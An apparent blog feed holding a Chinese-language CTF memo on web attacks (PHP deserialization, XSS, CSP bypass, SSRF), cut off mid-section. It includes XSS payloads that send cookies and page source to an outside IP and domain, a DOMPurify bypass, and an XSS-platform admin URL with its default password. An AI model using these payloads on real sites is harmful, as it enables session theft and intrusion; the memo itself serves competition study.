<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hpdoger</title>
  
  <subtitle>Valar Morghulis</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://hpdoger.cn/"/>
  <updated>2020-02-06T11:58:11.680Z</updated>
  <id>https://hpdoger.cn/</id>
  
  <author>
    <name>Hpdoger</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>持续更新中的CTF备忘录(持续更新)</title>
    <link href="https://hpdoger.cn/2025/01/04/My%20CTF%20Memo/"/>
    <id>https://hpdoger.cn/2025/01/04/My CTF Memo/</id>
    <published>2025-01-03T16:00:00.000Z</published>
    <updated>2020-02-06T11:58:11.680Z</updated>
    
    <content type="html"><![CDATA[<h1 id="My-CTF-Memo"><a href="#My-CTF-Memo" class="headerlink" title="My CTF Memo"></a>My CTF Memo</h1><p>自己比赛过程中使用的笔记，一些基础的知识点整理，如果自己还有机会打比赛会陆续push到这篇文章中</p><h1 id="各种配置文件位置"><a href="#各种配置文件位置" class="headerlink" title="各种配置文件位置"></a>各种配置文件位置</h1><h2 id="nginx配置文件"><a href="#nginx配置文件" class="headerlink" title="nginx配置文件"></a>nginx配置文件</h2><p>常用于查看路由转发，可能把flag藏到哪个路径</p><pre><code>/usr/local/nginx/conf/nginx.conf/etc/nginx/nginx.conf</code></pre><h2 id="nginx日志"><a href="#nginx日志" class="headerlink" title="nginx日志"></a>nginx日志</h2><pre><code>/var/log/nginx/access.log;/var/log/nginx/error.log</code></pre><h1 id="PHP知识"><a href="#PHP知识" class="headerlink" title="PHP知识"></a>PHP知识</h1><h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>两个字节可以异或出来不同的字母，然后字符串的异或也是按位进行的，每个字节和对应的字节进行异或然后拼接</p><p><img src="http://static.zybuluo.com/1160307775/83s1wac85uhpalqusrqvv2lf/image_1dl3pck7o1600130m19djirkkbd1p.png" alt="image_1dl3pck7o1600130m19djirkkbd1p.png-81.7kB"></p><h2 id="变量命名"><a href="#变量命名" class="headerlink" title="变量命名"></a>变量命名</h2><p>php命名变量支持使用大括号包裹，但是仍然要使用$符号<br><img src="http://static.zybuluo.com/1160307775/l9b1p48gsdxb98yafs1syn1y/image_1dnc6tbnmb3u18e4r7320b155e9.png" alt="image_1dnc6tbnmb3u18e4r7320b155e9.png-58.9kB"></p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>通常造成漏洞点就是extract，和$符号的使用。典型的SESSION覆盖例子如下</p><pre><code>&lt;?php    session_start();    foreach (array_keys($_REQUEST) as $v) {        $key = $v;        $$key = $_REQUEST[$v];    }</code></pre><p>poc:<code>index.php?_SESSION[admin]=true</code></p><p>在php中，无论cookie/session/get/post都是一个数组，通过hpp传入一个数组(‘admin’=&gt;true)，覆盖各种值。</p><p>上面的poc，在变量覆盖的层面表达如下：</p><pre><code>$_SESSION = array(&#39;admin&#39;=&gt;&#39;true&#39;);</code></pre><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>对于一些PHP文件，可以用P神最近的项目来审:<a href="https://phpchip.com/" target="_blank" rel="noopener">https://phpchip.com/</a></p><p>挖掘动态PHP代码中存在的安全隐患，而且包含了很多函数，对于小型CTF的代码的自动审计来说够用了。</p><p><img src="http://static.zybuluo.com/1160307775/hbq2u24im63am63sj6k6r3pv/image_1dsgmve7218qm1j5mbchsl03a99.png" alt="image_1dsgmve7218qm1j5mbchsl03a99.png-37.8kB"></p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="常识"><a href="#常识" class="headerlink" title="常识"></a>常识</h2><ul><li>在反序列化的时候，不会执行__construct里的值</li><li>原类中无法控制的private/protected变量，可以自己用构造方法序列化进去</li><li>php允许动态调用函数，函数名可以是字符串<br><img src="http://static.zybuluo.com/1160307775/dlevq47gan2c6hcjiaip5pxp/image_1di9sfr2g6gpga81h0t12mod9i9.png" alt="image_1di9sfr2g6gpga81h0t12mod9i9.png-61.4kB"></li></ul><p>如果要在类内动态调用函数，则需要用大括号包裹<br><img src="http://static.zybuluo.com/1160307775/mtwa9vsmcizlna828gu6ns89/image_1di9sjrriems2t1djm40b67d3m.png" alt="image_1di9sjrriems2t1djm40b67d3m.png-154.3kB"></p><ul><li>找到反序列化的入口很关键</li><li>反序列化的时候，php根据长度去读取值，所以双引号不会被转译，如下面的例子，它的a的值长度为8，所以php知道从哪里开始&amp;哪里结束，就没必要转移双引号。<br><img src="http://static.zybuluo.com/1160307775/h0si6pyl99969588wkx7bo65/image_1dmq5jh6dt671mc81i4f1idod1t9.png" alt="image_1dmq5jh6dt671mc81i4f1idod1t9.png-202.7kB"></li></ul><h2 id="代码审计骚操作"><a href="#代码审计骚操作" class="headerlink" title="代码审计骚操作"></a>代码审计骚操作</h2><h3 id="属性值逃逸"><a href="#属性值逃逸" class="headerlink" title="属性值逃逸"></a>属性值逃逸</h3><p>在常识中提到一点就是php识别value的长度来取值，如果定义的长度大于value的真实长度往后面继续填充字符，直到满足长度。</p><p>这里就存在一个问题，如果说我们序列化的内容是某一属性的内容，如果有类似于replace的操作改变属性值的长度，攻击者就可以构造出来一个”长度固定”的内容，里面夹杂着pop链，让php反序列在识别内容的时候到pop链的地方终止，而pop链就可以被反序列化。</p><p>具体的一个漏洞分析可以看：<a href="https://xz.aliyun.com/t/6521" target="_blank" rel="noopener">Joomla3.4.6-RCE</a></p><p>这个漏洞的核心点就是：传入的<code>username</code>包含\0\0\0，在session_start的时候调用read()进行反序列化，因为<code>username</code>的长度不匹配，就会向后继续填充字段。我们在<code>password</code>构造剩余字段长度+pop链。剩余字段长度用来填充<code>username</code>，然后pop链会被反序列化</p><h2 id="常见魔法函数"><a href="#常见魔法函数" class="headerlink" title="常见魔法函数"></a>常见魔法函数</h2><p><a href="https://www.anquanke.com/post/id/159206" target="_blank" rel="noopener">https://www.anquanke.com/post/id/159206</a></p><h3 id="phar通用"><a href="#phar通用" class="headerlink" title="phar通用"></a>phar通用</h3><p>利用条件：</p><ul><li>有一个文件上传点，上传白名单的文件，里面是phar序列化的值</li><li>能够触发phar的函数，参数要可控</li><li>当应用层过滤了phar://时，可以用<code>php://filter/source=phar://xxx</code>绕过</li></ul><p>能够触发的函数:</p><pre><code>fileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile、md5_file、filesize</code></pre><p>通用phar文件写法：</p><pre><code>&lt;?php class someclass{}@unlink(&quot;hpdoger.phar&quot;);$test = new someclass(); // 实例化要用的类，可以给属性赋值$phar = new Phar(&quot;hpdoger.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // 增加gif文件头$phar-&gt;setMetadata($test);$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;); //添加要压缩的文件$phar-&gt;stopBuffering();rename(&quot;hpdoger.phar&quot;,&quot;hpdoger.gif&quot;); //更改后缀名?&gt;</code></pre><h2 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h2><h3 id="调用pickle"><a href="#调用pickle" class="headerlink" title="调用pickle"></a>调用pickle</h3><p>序列化</p><pre><code>pickle.dump(文件) pickle.dumps(字符串)</code></pre><p>反序列化</p><pre><code>pickle.load(文件)pickle.loads(字符串)</code></pre><h3 id="flask低版本session反序列化"><a href="#flask低版本session反序列化" class="headerlink" title="flask低版本session反序列化"></a>flask低版本session反序列化</h3><p>1.5以下版本的flask处理Session使用的是pickle，所以存在反序列化-rce</p><h3 id="numpy"><a href="#numpy" class="headerlink" title="numpy"></a>numpy</h3><p>这个函数也存在反序列化漏洞</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p><a href="https://www.smi1e.top/%e4%bb%8ebalsn-ctf-pyshv%e5%ad%a6%e4%b9%a0python%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96/" target="_blank" rel="noopener">从Balsn CTF pyshv学习python反序列化</a></p><p><a href="https://www.anquanke.com/post/id/188981#h2-0" target="_blank" rel="noopener">Python pickle 反序列化实例分析</a></p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="常识-1"><a href="#常识-1" class="headerlink" title="常识"></a>常识</h2><h3 id="各种xss标签-属性-poc"><a href="#各种xss标签-属性-poc" class="headerlink" title="各种xss标签/属性-poc"></a>各种xss标签/属性-poc</h3><p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" rel="noopener">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p><h3 id="dom结构"><a href="#dom结构" class="headerlink" title="dom结构"></a>dom结构</h3><p>取url中”#”后面的字符串</p><pre><code>document.location.hash.substr(1)</code></pre><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><h4 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h4><p>javascript支持的unicode格式是:<code>\uxxxx</code>，其中xxxx代表四位16进制数值，通常我们说的<code>a</code>的ascii码为<code>97</code>(10进制表示)，转换成unicode(16进制)就是<code>61</code>，缺位补0，最终的效果就是<code>\u0061</code><br><img src="http://static.zybuluo.com/1160307775/x4sqpwimtex6xuer47ljmui1/image_1dpsb5m4g1tpr1ju810j12q67vi9.png" alt="image_1dpsb5m4g1tpr1ju810j12q67vi9.png-2.8kB"></p><p>写一个函数可以转换String-&gt;unicode</p><pre><code>function str2unicode(char){    return &quot;\\u&quot; + char.charCodeAt().toString(16).padStart(4,00)}str2unicode(&quot;a&quot;)</code></pre><p>在含有javascript语意的地方可以用unicode绕过某些过滤</p><pre><code>eval(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)=&gt;eval(&quot;alert(1)&quot;)</code></pre><p>直接在控制台运行<code>\u0061\u006c\u0065\u0072\u0074(1)</code>也一样。es6以后支持使用<code>\u{xxxx}</code>的写法，所以下面两种unicode的表达形式一样:</p><pre><code>\u{0061}\u0061</code></pre><h4 id="html编码"><a href="#html编码" class="headerlink" title="html编码"></a>html编码</h4><p>&amp;#106=&amp;#0000106</p><p>有没有’;’都一样，都是html编码。106是ascii编码值，默认编码格式占7位。浏览器接受html编码的时候，会转换为对应的字符。但是对于<code>&lt;、&gt;、#、&amp;、&quot;</code>这些字符，也有相应的html编码，但是浏览器会把它们解释成实体编码的符号再输出，即<code>&amp;#34;</code>转化<code>&amp;quot;</code>再呈现到页面显示为<code>&quot;</code>。</p><p>这种情况有时候可以绕过waf，当输出点在Html标签时可以尝试用<code>&amp;#34;</code>，因为是html语境会先进行一次html解码，解释为正常的<code>&quot;</code></p><h4 id="utf8-utf16-utf32"><a href="#utf8-utf16-utf32" class="headerlink" title="utf8/utf16/utf32"></a>utf8/utf16/utf32</h4><p>可以绕过xss-auditor，具体看这篇文章：<a href="http://d1iv3.me/2017/08/05/XSS%E4%B8%8E%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81-UTF-7-UTF-8-UTF-16-UTF-32/?nsukey=Eeg77mV0jrAMDctXgPEgMcQdPwI0tpMDjpJrZSh5NdtQwOYv%2FnEgOlImAU92fuuh6dSHidilPty6DWoPn7gvdXd%2FxK5gISZXUuzI8Y6EdZXPEGz9Beg2e%2BNNzDKZ65Lof%2B6eMg9DtcJGKu5ntRRMm6lVhwQZ2QrgGwwnMu%2Bp38SLHYVNrml6aKuFF3sDwR1JnU3%2BcG8MI0VWLfhyzEP14w%3D%3D" target="_blank" rel="noopener">XSS与字符编码(UTF-7, UTF-8, UTF-16, UTF-32</a></p><p>生成对应编码的payload如下：</p><pre><code>&gt;&gt;&gt; print(quote((&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;).encode(&#39;utf-16&#39;)))%FF%FE%3C%00s%00c%00r%00i%00p%00t%00%3E%00a%00l%00e%00r%00t%00%28%001%00%29%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><h3 id="svg-amp-style"><a href="#svg-amp-style" class="headerlink" title="svg&amp;style"></a>svg&amp;style</h3><p>在<code>&lt;style&gt;</code>标签中不允许存在子标签(style标签最初的设计理念就不能用来放子标签)，如果存在会被当作text解析，这也就是Chrome的Text模式，如下图所示。</p><p><img src="http://static.zybuluo.com/1160307775/1drqlgt54g11k4z1iks7vt39/image_1ds71a2161dc61kknfq01prg8s6m.png" alt="image_1ds71a2161dc61kknfq01prg8s6m.png-36.6kB"></p><p>但是在<code>&lt;svg&gt;</code>标签下，若存在子标签<code>&lt;style&gt;</code>，则<code>&lt;style&gt;</code>标签中的子标签是可以被解析为html正常标签的，如下图。原因就是当你在HTML中打开<code>&lt;svg&gt;</code>时，浏览器的解析规则会发生变化，解析规则趋于XML解析而不是HTML解析</p><p><img src="http://static.zybuluo.com/1160307775/k3tiztcxhj1txqw12kadolw2/image_1ds71f9af1khd1rl81v3fme812b322.png" alt="image_1ds71f9af1khd1rl81v3fme812b322.png-41kB"></p><h4 id="mXSS-突变XSS基础标签"><a href="#mXSS-突变XSS基础标签" class="headerlink" title="mXSS(突变XSS基础标签)"></a>mXSS(突变XSS基础标签)</h4><p><code>&lt;svg&gt;</code>的子标签不能存在<code>&lt;p&gt;</code>，因为<code>&lt;p&gt;</code>是svg的非法标签，如果存在则会被当作同级标签处理。我们拿<code>a</code>和<code>p</code>来作为子标签比较如下<br><img src="http://static.zybuluo.com/1160307775/p1r0b27xj7qcnheu8pe9j6ue/image_1ds76d021te0165h8jjqbb1nf12s.png" alt="image_1ds76d021te0165h8jjqbb1nf12s.png-38.9kB"></p><h3 id="innerHTML"><a href="#innerHTML" class="headerlink" title="innerHTML"></a>innerHTML</h3><p>innerHTML跟浏览器的解析规则一样：会自动补全标签</p><h3 id="DOMPurify"><a href="#DOMPurify" class="headerlink" title="DOMPurify"></a>DOMPurify</h3><p>DOMPurify是防止XSS的前端库，介绍和用法见:<a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noopener">https://github.com/cure53/DOMPurify</a></p><p>默认配置下，DOMPurify允许所有标签(<code>&lt;div&gt;</code>，<code>&lt;svg&gt;</code>，<code>&lt;p&gt;</code>，<code>&lt;style&gt;</code>和<code>&lt;a&gt;</code>)和属性id。所以它不会改变代码中的任何内容。</p><p>因此产生了一种bypass方式，利用点：</p><ul><li>DOMPurify &lt; 2.0.1</li><li>页面某处调用两次innerHTML</li></ul><p>漏洞原理大致意思：<br>我们把xss语句放进id属性里，前面跟上<code>&lt;style&gt;</code>标签，并用<code>&lt;svg&gt;</code>标签作为父标签。利用innerHTML的特性：跳出<code>&lt;svg&gt;</code>，这样<code>style</code>标签就会把后面的内容作为text处理，从而把id里面的<code>&lt;img&gt;</code>标签解析为html，payload如下:</p><pre><code>&lt;svg&gt;&lt;/p&gt;&lt;style&gt;&lt;a id=&quot;&lt;/style&gt;&lt;img src=1 onerror=alert(1)&gt;&quot;&gt;</code></pre><p>经过Dumpurify清洗之后，不会有任何变化。然后把这个值进行两次innerHTML赋值，就能弹窗了，流程:</p><pre><code>第一次innerHTML =&gt; &lt;svg&gt;&lt;p&gt;&lt;/p&gt;&lt;style&gt;&lt;a id=&quot;&lt;/style&gt;&lt;img src=1 onerror=alert(1)&gt;&quot;&gt;&lt;/a&gt;&lt;/style&gt;&lt;/svg&gt; 第二次innerHTML =&gt; &lt;svg&gt;&lt;/svg&gt;&lt;p&gt;&lt;/p&gt;&lt;style&gt;&lt;a id=&quot;&lt;/style&gt;&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot;&gt;&quot;&amp;gt; #跳出svg,成功弹窗</code></pre><p>不懂得可以先一下笔记mXSS，漏洞相关文档:<a href="https://xz.aliyun.com/t/6413" target="_blank" rel="noopener">利用突变XSS绕过DOMPurify 2.0.0</a></p><p>第二次innerHTML的时候，svg和p变成了兄弟标签，从而style标签开始text解析模式读到<code>&lt; id=&quot;&quot;</code>，之后就把img标签解析成html了。</p><h3 id="DOM-Clobbering-Attack"><a href="#DOM-Clobbering-Attack" class="headerlink" title="DOM Clobbering Attack"></a>DOM Clobbering Attack</h3><p><a href="http://d1iv3.me/2018/04/11/DOM-Clobbering-Attack/" target="_blank" rel="noopener">http://d1iv3.me/2018/04/11/DOM-Clobbering-Attack/</a></p><p>id值可以创造window.xxx/全局变量</p><pre><code>&lt;img id=&quot;hpdoger&quot;&gt; 等价于 window.hpdoger 等价于 hpdoger</code></pre><p>name值可以创造document.xxx变量</p><pre><code>&lt;img name=&quot;hpdoger&quot;&gt; 等价于 document.hpdoger</code></pre><h2 id="各种标签"><a href="#各种标签" class="headerlink" title="各种标签"></a>各种标签</h2><h3 id="js创建标签"><a href="#js创建标签" class="headerlink" title="js创建标签"></a>js创建标签</h3><pre><code>script=document.createElement(&#39;script&#39;);script.src=&#39;//bo0om.ru/csp.js&#39;;document.body.appendChild(script);</code></pre><h3 id="a标签"><a href="#a标签" class="headerlink" title="a标签"></a>a标签</h3><p>可以用autofocus  猫哥给的，感觉不能onload的标签都可以试一下。不过这个需要点击一下才能触发</p><pre><code>&lt;a contenteditable onfocus=alert(document.location) autofocus href=&quot;aaa&quot;&gt;aaaaaaaaaaaaa&lt;/a &gt;</code></pre><p>还有一个更骚的，利用锚点自动聚焦触发，只需要在url后面加#1</p><pre><code>&lt;a onfocus=&quot;alert(document.cookie)&quot; id=&quot;1&quot; tabindex=&quot;0&quot;&gt;&lt;/a &gt;</code></pre><p><img src="http://static.zybuluo.com/1160307775/ett6l17ebtak7tpieba9qah9/image_1dkpti8oq1ab21r101am733omkc9.png" alt="image_1dkpti8oq1ab21r101am733omkc9.png-45.1kB"></p><h3 id="frameset标签"><a href="#frameset标签" class="headerlink" title="frameset标签"></a>frameset标签</h3><pre><code>&lt;frameset onpageshow=alert(1)&gt;</code></pre><h2 id="各种协议"><a href="#各种协议" class="headerlink" title="各种协议"></a>各种协议</h2><h3 id="data"><a href="#data" class="headerlink" title="data"></a>data</h3><p>data:text/html</p><p>适用于src属性后面，能解析js语句的函数(例如eval,setTimeout)</p><pre><code>data:text/html;base64,xxxx</code></pre><p>注意点：<br>1、xxx即恶意payload的base64编码，用console的btoa来编码payload，不要用其它的base64编码</p><p>2、还有一种冷门的用法，执行点在charset，前提是需要定义window.text、window.html、window.base64</p><pre><code>eval(&#39;data:text/html;charset=alert(1);base64,whatever&#39;)</code></pre><p>这个用法的例子见:<a href="https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html" target="_blank" rel="noopener">https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html</a></p><h2 id="XSS平台"><a href="#XSS平台" class="headerlink" title="XSS平台"></a>XSS平台</h2><p>搭建的蓝莲花xss平台：<a href="http://120.79.152.66:8000/admin.php" target="_blank" rel="noopener">http://120.79.152.66:8000/admin.php</a></p><p>默认密码:<strong>bluelotus</strong></p><p>可以导入模版，然后修改地址为自己的平台url，点击<strong>生成payload</strong>就可以看到js所在路径<br><img src="http://static.zybuluo.com/1160307775/12ow2gpzv3ed0bhcd86pm8ea/image_1diml87oh5dg1iuqed313gu16pc9.png" alt="image_1diml87oh5dg1iuqed313gu16pc9.png-196.5kB"></p><p>还可以进行一些编码<br><img src="http://static.zybuluo.com/1160307775/0op7d8bksx2xdqbj6s1xe6ov/image_1diml9qdf1j26gs4knb1tcc9r5m.png" alt="image_1diml9qdf1j26gs4knb1tcc9r5m.png-78.1kB"></p><h2 id="打页面源码"><a href="#打页面源码" class="headerlink" title="打页面源码"></a>打页面源码</h2><h3 id="当前页面"><a href="#当前页面" class="headerlink" title="当前页面"></a>当前页面</h3><pre><code>&lt;svg/onload=&quot;document.location=&#39;http://120.79.152.66:8000/?&#39;+btoa(document.body.innerHTML)&quot;&gt;</code></pre><h3 id="其他页面"><a href="#其他页面" class="headerlink" title="其他页面"></a>其他页面</h3><pre><code>&lt;script&gt;function createXmlHttp() {    if (window.XMLHttpRequest) {        xmlHttp = new XMLHttpRequest()    } else {        var MSXML = new Array(&#39;MSXML2.XMLHTTP.5.0&#39;, &#39;MSXML2.XMLHTTP.4.0&#39;, &#39;MSXML2.XMLHTTP.3.0&#39;, &#39;MSXML2.XMLHTTP&#39;, &#39;Microsoft.XMLHTTP&#39;);        for (var n = 0; n &lt; MSXML.length; n++) {            try {                xmlHttp = new ActiveXObject(MSXML[n]);                break            } catch(e) {}        }    }}createXmlHttp();xmlHttp.onreadystatechange = function(){  if (xmlHttp.readyState == 4) {        code=escape(xmlHttp.responseText);        createXmlHttp();        url = &quot;http://120.79.152.66:8001/?code&quot;;   //这里是我们服务器接受的地址        cc = &quot;htmlcode=&quot; + code +&quot;&amp;filename=hint.html&quot;;        xmlHttp.open(&quot;POST&quot;, url, true);        xmlHttp.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);        xmlHttp.send(cc)  }};xmlHttp.open(&quot;GET&quot;, &quot;/hint.html&quot;, true);//这块填写获得的后台地址。xmlHttp.send(null);&lt;/script&gt;</code></pre><p>还可以使用fetch这个异步请求捕捉页面。</p><pre><code>fetch(&#39;/admin.html&#39;).then(x =&gt; x.text()).then(x =&gt; {    location = &#39;http://rwx.kr/?d=&#39; + btoa(x);});</code></pre><h2 id="打cookie"><a href="#打cookie" class="headerlink" title="打cookie"></a>打cookie</h2><h3 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h3><pre><code></code></pre><h3 id="window-location"><a href="#window-location" class="headerlink" title="window.location"></a>window.location</h3><pre><code>window.location = &#39;http://120.79.152.66&#39;+document.cookie</code></pre><h3 id="image"><a href="#image" class="headerlink" title="image"></a>image</h3><pre><code>new Image().src=&#39;http://120.79.152.66/flag=&#39;+document.cookie</code></pre><h2 id="XHR请求"><a href="#XHR请求" class="headerlink" title="XHR请求"></a>XHR请求</h2><pre><code>xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function(){    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)    {        document.location=&#39;http://vps_ip:23333/?&#39;+btoa(xmlhttp.responseText);    }}xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=xxx&quot;);</code></pre><h2 id="CSP相关"><a href="#CSP相关" class="headerlink" title="CSP相关"></a>CSP相关</h2><h3 id="查询csp缺陷"><a href="#查询csp缺陷" class="headerlink" title="查询csp缺陷"></a>查询csp缺陷</h3><p>复制浏览器返回的csp头，到:<a href="https://csp-evaluator.withgoogle.com/，可以查看当前csp的缺陷(比如，忘了设置什么)" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/，可以查看当前csp的缺陷(比如，忘了设置什么)</a><br><img src="http://static.zybuluo.com/1160307775/pcn97h1b3fyb4s0ue8rb01ne/image_1dq9cm5f1k7tdjkukd12vuq99.png" alt="image_1dq9cm5f1k7tdjkukd12vuq99.png-81.3kB"></p><h3 id="window-location-1"><a href="#window-location-1" class="headerlink" title="window.location"></a>window.location</h3><p>这个东西可以bypass csp，因为他不属于资源</p><pre><code>window.location = &#39;http://120.79.152.66&#39;+document.cookie</code></pre><p>可以看总结：<a href="https://xz.aliyun.com/t/5084" target="_blank" rel="noopener">https://xz.aliyun.com/t/5084</a></p><h3 id="csp限制目录bypass"><a href="#csp限制目录bypass" class="headerlink" title="csp限制目录bypass"></a>csp限制目录bypass</h3><p><img src="http://static.zybuluo.com/1160307775/fva575tblvauko4na3f5grzw/image_1dil1li3v1k224l1g3q5cc16v49.png" alt="image_1dil1li3v1k224l1g3q5cc16v49.png-160.9kB"></p><p>csp目录限制<code>content=&quot;script-src pastebin.com/XYZ/&quot;</code></p><p>但是用这种方法可以跨目录加载到<code>pastebin.com/b0Rajxqk</code>的js文件</p><p>具体原理应该是rpo:<a href="https://www.jianshu.com/p/5b174dcba362" target="_blank" rel="noopener">RPO攻击导致的XSS</a></p><h3 id="iframe来bypassCSP"><a href="#iframe来bypassCSP" class="headerlink" title="iframe来bypassCSP"></a>iframe来bypassCSP</h3><p>当一个同源站点，同时存在两个页面，其中<strong>一个有CSP保护的A页面</strong>，<strong>另一个没有CSP保护B页面</strong>。</p><p>那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，A页面的CSP防护完全失效<br><img src="http://static.zybuluo.com/1160307775/orcqk8cgbz10far21uvn5zb1/image_1dd8b6jsku4c129k14vflmutk5p.png" alt="image_1dd8b6jsku4c129k14vflmutk5p.png-59.6kB"></p><h3 id="Access-control-allow-origin"><a href="#Access-control-allow-origin" class="headerlink" title="Access-control-allow-origin"></a>Access-control-allow-origin</h3><p>当Access-control-allow-origin指定origin的时候，考虑下面一种情况也可以Bypass CSP(CORS的错误配置):</p><p>CSP页面<strong>存在缓存记录</strong>且“Access-Control-Allow-Origin”已经被设置，但是“Access-Control-Allow-Credentials: true”并且“Vary: Origin”头没有被设置(或者不存在)</p><p>可以利用缓存进行XSS-&gt;加载远程的JS脚本=&gt;bypass CSP<br>具体文章可以看这一篇：<a href="https://xz.aliyun.com/t/2745#toc-18，未来的CTF很可能有这一方面的考点" target="_blank" rel="noopener">https://xz.aliyun.com/t/2745#toc-18，未来的CTF很可能有这一方面的考点</a></p><h2 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h2><h3 id="unicode-1"><a href="#unicode-1" class="headerlink" title="unicode"></a>unicode</h3><p>eval的绕过，通过填充\u0028换行分割符、\u2029段落分隔符</p><pre><code>eval(&#39;\u2028alert\u2029(1)&#39;)</code></pre><h3 id="浏览器解析"><a href="#浏览器解析" class="headerlink" title="浏览器解析"></a>浏览器解析</h3><h4 id="域名中的点号"><a href="#域名中的点号" class="headerlink" title="域名中的点号"></a>域名中的点号</h4><pre><code>%E3%80%82=&gt; url解码为: &quot;。&quot; =&gt;浏览器会把它解释为 &quot;.&quot; =&gt; bypass &quot;.&quot;的限制</code></pre><p>还有一种bypass来绕过window.location.host的判断<br><img src="http://static.zybuluo.com/1160307775/k2e2blpvm3rnuzmxhj4k78ue/image_1dtkt6ll71mmvjuh1bg5egq12bq9.png" alt="image_1dtkt6ll71mmvjuh1bg5egq12bq9.png-12.5kB"></p><p>在域名的后面加”.”号就行了，即<code>treasure.npointer.cn.</code>解析到<code>treasure.npointer.cn</code></p><p><img src="http://static.zybuluo.com/1160307775/d4bgmtnynalf5wseokjwqbsp/image_1dtkta0tr14jj19pi1shju2n1gg32c.png" alt="image_1dtkta0tr14jj19pi1shju2n1gg32c.png-9.6kB"></p><h4 id="突破双引号限制"><a href="#突破双引号限制" class="headerlink" title="突破双引号限制"></a>突破双引号限制</h4><p>如果我们因为某个双引号，js报错的话，可以使用注释的方法，注释最后一个正确双引号后的所有内容。</p><p>看hitcon2019的例子，这里我们有三个双引号，但是依然可以跳转到<code>https://hpdoger.cn?document.cookie</code>，原因就是后面的<code>·--&gt;</code>可以注释后面的语句，即注释了后面的双引号。</p><p>原理就是–&gt;可以被当作注释符号，但必须有<code>\n</code>和<code>\r</code>来换行，才能注释。<br><img src="http://static.zybuluo.com/1160307775/z3bov0lhmusb9um8n8g690qn/image_1dneipo85gfdao1v301iq170q9.png" alt="image_1dneipo85gfdao1v301iq170q9.png-130.7kB"></p><p>这道题目过滤<code>\n</code>或<code>\r</code>，但是ECMA-262标准中，还有其他的换行符<br><img src="https://i.loli.net/2019/10/15/btWyJmw3Q7o4XMO.png" alt></p><p>所以unicode中<code>\u{2028}</code>也可用作换行，后端服务器不会解码<code>%E2%80%A8</code>，前端浏览器会把它当作实心点号解析，但其实是换行的标志位。<br><img src="http://static.zybuluo.com/1160307775/bjypn0138ruhused6961m45f/image_1dnej0u2r1ocr1fnc5f71hu81l33m.png" alt="image_1dnej0u2r1ocr1fnc5f71hu81l33m.png-11.1kB"></p><p>那么上面的payload最终的形式应该是这样:</p><pre><code>https://hpdoger.cn/?&quot;%2beval(atob(`ZG9jdW1lbnQuY29va2ll`))%E2%80%A8--&gt;</code></pre><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="常见题型"><a href="#常见题型" class="headerlink" title="常见题型"></a>常见题型</h2><h3 id="gopher打mysql"><a href="#gopher打mysql" class="headerlink" title="gopher打mysql"></a>gopher打mysql</h3><p>前提是:<br>1、已知mysql的账号密码(大概率通过php文件泄漏的方式)<br>2、存在ssrf</p><p>原理都是利用SSRF拿Gopher协议发送构造好的TCP/IP数据包攻击mysql</p><p>相关文章：<br><a href="https://yinwc.github.io/2018/07/31/Gopher/" target="_blank" rel="noopener">https://yinwc.github.io/2018/07/31/Gopher/</a><br><a href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/#GopherMySQL" target="_blank" rel="noopener">https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/#GopherMySQL</a></p><p>不去抓本地包再构造，有一个自动生成poc的工具：<a href="https://github.com/undefinedd/extract0r-" target="_blank" rel="noopener">https://github.com/undefinedd/extract0r-</a></p><h2 id="过滤指定字符串"><a href="#过滤指定字符串" class="headerlink" 